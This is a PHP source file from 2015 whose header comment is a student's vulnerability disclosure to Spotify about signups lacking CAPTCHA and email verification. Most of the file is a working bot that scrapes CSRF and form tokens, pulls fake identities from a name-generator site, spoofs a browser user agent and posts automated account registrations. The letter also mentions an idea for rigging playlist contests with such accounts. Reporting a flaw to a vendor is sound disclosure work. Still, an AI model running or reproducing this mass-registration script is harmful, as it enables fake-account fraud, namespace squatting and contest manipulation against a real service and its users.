<?php
include_once('simple_html_dom.php');
/**
 * Created by PhpStorm.
 * User: Admin
 * Date: 4/19/15
 * Time: 1:11 AM
 */
/*
Hello Spotify Security Team,

My name is Alexander Lin and I am a current freshmen college student. I am emailing about a certain vulnerability to Spotify's username namespace.
t has come to my attention that the Signups on the Spotify website are vulnerable to simple scripts that can create accounts upon accounts for whatever malicious intent the scriptor might have.
There is a lack of a Captcha system, which could very easily solve this problem, and there is a lack of email verification.
While perhaps this is less sensitive than the problem of people trying to rip music off your site (which is near impossible now thanks to your Hermes Protocol, very well done I might add),
protecting your namespace is vital as it would save disk space and prevent namespace issues for actual users.

The script that I have attached below is an example of a namespace attack that can be run against your site. While it is a bit slower due to limitations of bandwidth and/or other
dependencies, running this simple script in parallel with other servers/computers could, within reasonable time, eliminate namespace of up to 5 characters possibly even 6 assuming
only numbers and letters are used. This I can imagine would not be a huge concern since most people make longer usernames anyways, but this script could be modified to use dictionary
word permutations to eliminate common usernames that would otherwise be used by actual users.

At the same time, email namespace is also being taken at the same time of signup. Not incorporating Captcha nor email verification eliminates the namespace for both usernames
and emails. I would highly recommend implementing captcha or text verification or email verification if at all possible to stop simple script such at these.

If this is not enough to convince you, I can also explain a way that I have thought of that implements the Spotify Web API along with this script that can "follow" certain
playlists potentially affecting regional competitions that are going on right now such as Sound Clash. This idea is actually how everything started out. We were joking about
making a bot following our playlist to win. Obviously we never meant to do it, but I was curious. Thus I created this script that allowed me to make accounts nonstop, but
clicking the "follow" button was harder since it's masked in a protocol I am unfamiliar with ( I'm a freshmen in college, everything is unfamiliar to me ).

Thank you for your time and consideration. This is my first time reporting any potential security flaw, so thank you for bearing with me.

Humbly,
Alexander Lin

P.S. simple_html_dom.php is a dependency and Spotifier.php is the actual account creation script.
*/

$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://www.spotify.com/us/signup/');
curl_setopt($ch, CURLOPT_COOKIEJAR, "./SpotCookies.txt");
$fake_user_agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040803 Firefox/0.9.3';
curl_setopt($ch, CURLOPT_USERAGENT, $fake_user_agent);
curl_setopt ($ch, CURLOPT_CAINFO, dirname(__FILE__)."/cacert.pem");
$result = curl_exec($ch);
curl_close($ch);

preg_match_all('/\<input name=\"form_token\" type=\"hidden\" value=\"(.*?)\"\>/', $result, $form);
$form_token = $form[1][0];
if(file_exists ('./SpotCookies.txt'))
{
    $file = file_get_contents('./SpotCookies.txt', true);
    preg_match_all('/sp_csrf(.*?)\n/', $file, $matches);
    $sp_csrf = str_replace(' ', '', $matches[1][0]);

    $html = file_get_html('http://www.fakenamegenerator.com/');
    $fakeinfo = array();
    //print_r($ro2);
    foreach($html->find('dl[class=dl-horizontal]') as $element)
    {
        $ro = preg_replace('/\s+/', ' ',$element->plaintext);
        array_push($fakeinfo,$ro);
    }
    $gender = 'female';
    foreach($html->find('img[width=121]') as $element3)
    {
        $gender = strtolower ($element3->alt);
    }

    $bodytag = str_replace(" This is a real email address. Click here to activate it!", "", $fakeinfo[1]);
    $fakeinfo[1] = $bodytag;

    $temp = explode(' ',$fakeinfo[1]);
    $email = $temp[3];
    $temp = explode(' ',$fakeinfo[2]);
    $username = $temp[2];
    $temp = explode(' ',$fakeinfo[3]);
    $password = $temp[2];
    preg_match("/: (.*) \(/",$fakeinfo[5], $bd);
    $fullbirthdate = $bd[1];
    $dob = explode(' ',$fullbirthdate);
    $dob[1] = str_replace(",", "", $dob[1]);
    $ts = strtotime($bd[1]);
    $month = date('n', $ts);
    $dob_month = sprintf("%02d", $month);
    $dob_date = $dob[1];
    $dob_year = date('Y', $ts);

    $username_avaliable = file_get_contents('https://www.spotify.com/us/xhr/json/isUsernameAvailable.php?username='.$username);
    $email_avaliable = file_get_contents('https://www.spotify.com/us/xhr/json/isEmailAvailable.php?email='.$email);

    if($username_avaliable=='true' && $email_avaliable='true')
    {
        $fields = array(
            'sp_csrf' => $sp_csrf,
            'form_token' => $form_token,
            'creation_flow' => '',
            'forward_url' => '%2Fus%2Fdownload%2F',
            'signup_pre_tick_eula' => 'true',
            'username' => $username,
            'password' => $password,
            'email' => $email,
            'confirm_email' => $email,
            'dob_month' => $dob_month,
            'dob_day' => $dob_date,
            'dob_year' => $dob_year,
            'gender' => $gender
        );
        print_r($fields);
        $fields_string='';
        foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
        rtrim($fields_string, '&');

        $chfinal = curl_init();
        curl_setopt($chfinal, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($chfinal, CURLOPT_URL, 'https://www.spotify.com/us/xhr/json/sign-up-for-spotify.php');

        curl_setopt($chfinal,CURLOPT_POST, count($fields));
        curl_setopt($chfinal,CURLOPT_POSTFIELDS, $fields_string);

        curl_setopt($chfinal, CURLOPT_POST, 1);
        curl_setopt($chfinal, CURLOPT_HEADER, 0);
        curl_setopt($chfinal, CURLOPT_FOLLOWLOCATION, 1);

        curl_setopt($chfinal, CURLOPT_USERAGENT, $fake_user_agent);
        curl_setopt ($chfinal, CURLOPT_CAINFO, dirname(__FILE__)."/cacert.pem");
        $resultsignup = curl_exec($chfinal);
        curl_close($chfinal);

        $success = json_decode($resultsignup,true);
        print_r($success);
        unlink('./SpotCookies.txt');
    }
    else
    {
        $result_array = array('username_avaliable' => $username_avaliable, 'email_avaliable' => $email_avaliable);
        print_r($result_array);
    }
}